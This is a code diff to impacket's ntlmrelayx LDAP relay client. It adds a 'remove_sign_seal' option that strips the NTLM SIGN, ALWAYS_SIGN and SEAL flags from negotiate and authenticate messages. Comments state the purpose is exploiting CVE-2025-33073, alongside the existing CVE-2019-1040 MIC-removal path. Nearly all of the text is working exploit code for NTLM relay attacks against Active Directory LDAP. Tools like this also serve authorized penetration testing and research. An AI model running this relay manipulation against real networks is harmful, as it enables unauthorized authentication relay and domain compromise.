@@ -32,7 +32,17 @@ except ImportError:
 
 from impacket.examples.ntlmrelayx.clients import ProtocolClient
 from impacket.nt_errors import STATUS_SUCCESS, STATUS_ACCESS_DENIED
-from impacket.ntlm import NTLMAuthChallenge, NTLMSSP_AV_FLAGS, AV_PAIRS, NTLMAuthNegotiate, NTLMSSP_NEGOTIATE_SIGN, NTLMSSP_NEGOTIATE_ALWAYS_SIGN, NTLMAuthChallengeResponse, NTLMSSP_NEGOTIATE_KEY_EXCH, NTLMSSP_NEGOTIATE_VERSION
+from impacket.ntlm import (
+    NTLMAuthChallenge,
+    NTLMSSP_AV_FLAGS,
+    AV_PAIRS,
+    NTLMAuthNegotiate,
+    NTLMSSP_NEGOTIATE_SIGN,
+    NTLMSSP_NEGOTIATE_SEAL,
+    NTLMSSP_NEGOTIATE_ALWAYS_SIGN,
+    NTLMAuthChallengeResponse,
+    NTLMSSP_NEGOTIATE_KEY_EXCH,
+    NTLMSSP_NEGOTIATE_VERSION)
 from impacket.spnego import SPNEGO_NegTokenResp
 
 PROTOCOL_CLIENT_CLASSES = ["LDAPRelayClient", "LDAPSRelayClient"]
@@ -69,11 +79,17 @@ class LDAPRelayClient(ProtocolClient):
         # When exploiting CVE-2019-1040, remove message signing flag
         # For SMB->LDAP this is required otherwise it triggers LDAP signing
         # Changing flags breaks the signature unless the client uses a non-standard implementation of NTLM
-        if self.serverConfig.remove_mic:
+        # CVE-2025-33073 also requires removing the sign flags
+        if self.serverConfig.remove_mic or self.serverConfig.remove_sign_seal:
             if negoMessage['flags'] & NTLMSSP_NEGOTIATE_SIGN == NTLMSSP_NEGOTIATE_SIGN:
                 negoMessage['flags'] ^= NTLMSSP_NEGOTIATE_SIGN
             if negoMessage['flags'] & NTLMSSP_NEGOTIATE_ALWAYS_SIGN == NTLMSSP_NEGOTIATE_ALWAYS_SIGN:
                 negoMessage['flags'] ^= NTLMSSP_NEGOTIATE_ALWAYS_SIGN
+
+        # When exploiting CVE-2025-33073, remove SEAL in addition to SIGN/ALWAYS_SIGN.
+        if self.serverConfig.remove_sign_seal:
+            if negoMessage['flags'] & NTLMSSP_NEGOTIATE_SEAL == NTLMSSP_NEGOTIATE_SEAL:
+                negoMessage['flags'] ^= NTLMSSP_NEGOTIATE_SEAL
 
         self.negotiateMessage = negoMessage.getData()
 
@@ -131,6 +147,15 @@ class LDAPRelayClient(ProtocolClient):
             authMessage['MICLen'] = 0
             authMessage['Version'] = b''
             authMessage['VersionLen'] = 0
+            token = authMessage.getData()
+
+        if self.serverConfig.remove_sign_seal:
+            if authMessage['flags'] & NTLMSSP_NEGOTIATE_SIGN == NTLMSSP_NEGOTIATE_SIGN:
+                authMessage['flags'] ^= NTLMSSP_NEGOTIATE_SIGN
+            if authMessage['flags'] & NTLMSSP_NEGOTIATE_ALWAYS_SIGN == NTLMSSP_NEGOTIATE_ALWAYS_SIGN:
+                authMessage['flags'] ^= NTLMSSP_NEGOTIATE_ALWAYS_SIGN
+            if authMessage['flags'] & NTLMSSP_NEGOTIATE_SEAL == NTLMSSP_NEGOTIATE_SEAL:
+                authMessage['flags'] ^= NTLMSSP_NEGOTIATE_SEAL
             token = authMessage.getData()
 
         with self.session.connection_lock:
